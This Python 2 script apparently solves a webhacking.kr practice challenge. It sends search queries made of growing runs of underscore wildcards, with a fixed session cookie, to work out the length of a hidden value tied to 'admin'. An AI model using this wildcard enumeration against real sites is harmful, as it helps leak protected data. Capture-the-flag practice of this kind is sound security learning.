#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import urllib
 
for i in range(1,30):
    url = "/challenge/web/web-33/index.php"
    body = urllib.urlencode({'search':'_'*i})
    header = {'Content-type':'application/x-www-form-urlencoded','Cookie':'PHPSESSID=bge4jmsp2lf8mq19a2s8dsk494'}
 
    conn = httplib.HTTPConnection('webhacking.kr')
    conn.request('POST',url,body,header)
    data = conn.getresponse().read()
    conn.close()
 
    # print data
    if(data.find('admin') == -1):
        print "size: {}".format(i-1)
        break
